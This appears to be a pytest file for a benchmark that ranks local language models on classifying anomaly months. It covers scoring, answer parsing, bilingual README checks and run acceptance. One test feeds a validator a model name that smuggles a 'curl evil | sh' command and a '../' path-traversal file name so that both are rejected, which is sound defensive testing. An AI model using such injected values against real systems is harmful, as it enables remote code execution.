"""Tests of the benchmark logic (no model server, no network)."""

import json
import random
import re
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from bench import common, discover, score  # noqa: E402

UPSTREAM = common.upstream_path()
needs_upstream = pytest.mark.skipif(not (UPSTREAM / "src" / "judge.py").exists(),
                                    reason="upstream checkout (5ltep-layer3) not available")


def test_gold_set_is_balanced_and_complete():
    gold = common.load_gold()
    cases = gold["cases"]
    assert len(cases) >= 28
    counts = {c: sum(1 for x in cases if x["gold"] == c) for c in score.CATS}
    assert all(n >= 7 for n in counts.values()), counts
    assert len({c["id"] for c in cases}) == len(cases)
    for c in cases:
        assert c["det_row"]["anomaly"], c["id"]  # production only judges flagged months
        assert c["month"] in {m["month"] for m in c["monthly"]}


@needs_upstream
def test_cases_render_with_the_production_prompt():
    judge, profile_mod = common.import_upstream()
    for c in common.load_gold()["cases"][:6]:
        system, prompt, schema, cats = common.render(c, judge, profile_mod)
        assert "<== anomaly" in prompt and c["month"] in prompt
        assert set(schema["properties"]["category"]["enum"]) == set(score.CATS)
        if c["gold"] == "PDC":
            assert "benchmark (synthetic)" not in prompt  # the source note never reaches the model


def test_parse_answer():
    cats = {c: "" for c in score.CATS}
    assert common.parse_answer(json.dumps({"category": "sp", "confidence": 0.9, "reasoning": "x"}), cats)["category"] == "SP"
    assert common.parse_answer("{not json", cats)["category"] == "INVALID"
    assert common.parse_answer(json.dumps({"category": "XYZ"}), cats)["category"] == "INVALID"


def test_macro_f1_and_majority():
    assert score.macro_f1([("SP", "SP"), ("PDC", "PDC"), ("DQE", "DQE"), ("GES", "GES")]) == 1.0
    assert score.macro_f1([("SP", "GES")] * 4) == 0.0
    runs = [{"category": "SP", "confidence": 0.4}, {"category": "GES", "confidence": 0.9},
            {"category": "INVALID", "confidence": 0}]
    assert score.majority(runs) == "GES"  # tie between valid labels -> higher confidence
    assert score.majority([{"category": "INVALID", "confidence": 0}] * 3) == "INVALID"


def test_metrics_and_paired_difference():
    rng = random.Random(1)
    gold = {f"c{i}": score.CATS[i % 4] for i in range(20)}

    def run(correct_share):
        answers = []
        for i, (cid, g) in enumerate(gold.items()):
            label = g if i < correct_share * 20 else score.CATS[(score.CATS.index(g) + 1) % 4]
            answers.append({"case": cid, "gold": g, "runs": [{"category": label, "confidence": 0.8,
                                                             "latency_s": 10.0 + i}] * 3})
        return {"answers": answers, "cases_done": 20, "cases_total": 20}

    good, bad = score.metrics(run(1.0), 200, rng), score.metrics(run(0.5), 200, rng)
    assert good["macro_f1"] == 1.0 and good["consistency"] == 1.0 and good["valid_rate"] == 1.0
    assert bad["macro_f1"] < 0.7
    diff = score.paired_diff(good, bad, gold, 500, rng)
    assert diff["diff"] > 0.3 and diff["ci95"][0] > 0


def test_entry_key_changes_only_with_what_matters():
    e = {"backend": "ollama", "model": "gemma3:4b", "digest": "d1", "options": {}}
    k = common.entry_key(e, "p1", "g1")
    assert k == common.entry_key(dict(e, label="another label"), "p1", "g1")
    assert k != common.entry_key(dict(e, digest="d2"), "p1", "g1")
    assert k != common.entry_key(e, "p2", "g1")
    assert k != common.entry_key(e, "p1", "g2")
    assert k != common.entry_key(dict(e, options={"think": False}), "p1", "g1")


def test_discovery_keeps_plain_size_tags():
    tags = ["4b", "12b", "e4b", "8b-a1b-q4_K_M", "4b-it-fp16", "4b-it-q8_0", "latest", "12b-mlx", "cloud", "4b-coder"]
    assert set(discover.candidate_tags(tags, ["code", "coder", "cloud"])) == {"12b", "4b", "8b-a1b-q4_K_M", "e4b"}
    assert discover.candidate_tags(["latest", "fp16"], []) == ["latest"]


def test_status_and_numbers_in_both_languages():
    row = {"macro_f1": 0.5, "_reasons": [("valid", 0.42), ("latency", 191.3), ("experiment", None)]}
    assert score.status_text(row, "en") == "not eligible: valid answers 42%; p90 latency 191s; experiment"
    assert score.status_text(row, "pt") == "não elegível: respostas válidas 42%; latência p90 de 191 s; experimento"
    assert score.status_text({"label": "x"}, "pt") == "ainda não executado"
    assert score.interval([0.657, 0.933], "pt") == "[0,657; 0,933]"
    assert score.interval([0.657, 0.933], "en") == "[0.657, 0.933]"


def test_readme_and_leiame_stay_parallel():
    """LEIAME.md is the full Portuguese version of README.md: same sections, same code blocks,
    both with the leaderboard markers that score.py fills, and each links to the other."""
    def structure(text):
        headings, fences, in_code = [], 0, False
        for line in text.splitlines():
            if line.startswith("```"):
                fences, in_code = fences + 1, not in_code
            elif not in_code and line.startswith("#"):
                headings.append(len(line) - len(line.lstrip("#")))
        return headings, fences

    def outside_markers(text):
        return re.sub(r"<!-- LEADERBOARD:START -->.*?<!-- LEADERBOARD:END -->", "", text, flags=re.S)

    readme = (common.ROOT / "README.md").read_text(encoding="utf-8")
    leiame = (common.ROOT / "LEIAME.md").read_text(encoding="utf-8")
    assert structure(outside_markers(readme)) == structure(outside_markers(leiame))
    for text in (readme, leiame):
        assert "<!-- LEADERBOARD:START -->" in text and "<!-- LEADERBOARD:END -->" in text
    assert "(LEIAME.md)" in readme and "(README.md)" in leiame


def test_status_badge(tmp_path, monkeypatch):
    monkeypatch.setattr(score, "RESULTS_DIR", tmp_path)
    score.write_status({"use": {"label": "qwen3:4b"}, "generated_at": "2026-09-30T18:07:00+00:00"})
    en = json.loads((tmp_path / "status.json").read_text(encoding="utf-8"))
    pt = json.loads((tmp_path / "status.pt.json").read_text(encoding="utf-8"))
    assert en == {"schemaVersion": 1, "label": "recommended model", "message": "qwen3:4b · 2026-09-30", "color": "brightgreen"}
    assert pt["label"] == "modelo recomendado"


def test_each_run_job_can_only_hand_over_its_own_result(tmp_path, monkeypatch):
    from bench import accept_runs
    monkeypatch.setattr(accept_runs, "RESULTS_DIR", tmp_path / "results")
    monkeypatch.setattr(accept_runs, "RUNS_DIR", tmp_path / "results" / "runs")
    (tmp_path / "results").mkdir()
    plan = {"entries": [{"label": "a:1b", "slug": "a_1b", "key": "k1", "backend": "ollama"},
                        {"label": "b:1b", "slug": "b_1b", "key": "k2", "backend": "ollama"}]}
    (tmp_path / "results" / "plan.json").write_text(json.dumps(plan))
    art = tmp_path / "art" / "run-a_1b"
    art.mkdir(parents=True)
    run = {"key": "k1", "label": "a:1b", "answers": [{"case": "c1", "runs": [
        {"category": "SP", "seed": 11, "latency_s": 1.0, "reasoning": "x" * 5000},
        {"category": "INVALID", "seed": 22, "latency_s": None, "tokens": None}]}]}  # a failed call
    (art / "a_1b__k1.json").write_text(json.dumps(run))
    forged = {"key": "k2", "label": "b:1b", "answers": []}  # a fake result for another candidate
    (art / "b_1b__k2.json").write_text(json.dumps(forged))
    accept_runs.main(str(tmp_path / "art"))
    out = tmp_path / "results" / "runs"
    assert (out / "a_1b__k1.json").exists() and not (out / "b_1b__k2.json").exists()
    kept = json.loads((out / "a_1b__k1.json").read_text())
    assert len(kept["answers"][0]["runs"][0]["reasoning"]) <= accept_runs.MAX_TEXT


def test_candidate_names_are_checked_and_new_builds_wait():
    from bench import plan
    from datetime import datetime, timedelta, timezone
    assert plan.safe_entry({"backend": "ollama", "label": "qwen3:4b", "model": "qwen3:4b"})
    assert not plan.safe_entry({"backend": "ollama", "label": "x", "model": "x'; curl evil | sh; '"})
    assert not plan.safe_entry({"backend": "llamacpp", "label": "g", "model": "g", "hf_repo": "o/r", "hf_file": "../x.gguf"})
    assert not plan.safe_entry({"backend": "docker", "label": "x", "model": "x"})
    sel = {"min_age_days_to_adopt": 30, "adopt_backends": ["ollama"]}
    recent = (datetime.now(timezone.utc) - timedelta(days=3)).isoformat()
    old = (datetime.now(timezone.utc) - timedelta(days=40)).isoformat()
    assert score.adoption_hold({"backend": "ollama", "entry": {"first_seen": recent}}, sel)[0] == "age"
    assert score.adoption_hold({"backend": "llamacpp", "entry": {"first_seen": old}}, sel)[0] == "backend"
    assert score.adoption_hold({"backend": "ollama", "entry": {"first_seen": old}}, sel) is None


def test_workflow_scripts_never_paste_expressions():
    """Values reach the shell through the environment, never pasted with ${{ }} (SECURITY.md)."""
    import yaml
    offenders = []
    for f in (common.ROOT / ".github").rglob("*.yml"):
        doc = yaml.safe_load(f.read_text(encoding="utf-8"))
        steps = [s for job in (doc.get("jobs") or {}).values() for s in job.get("steps", [])]
        steps += (doc.get("runs") or {}).get("steps", [])
        offenders += [f"{f.name}: {s.get('name', '')}" for s in steps if "${{" in str(s.get("run", ""))]
    assert not offenders, offenders
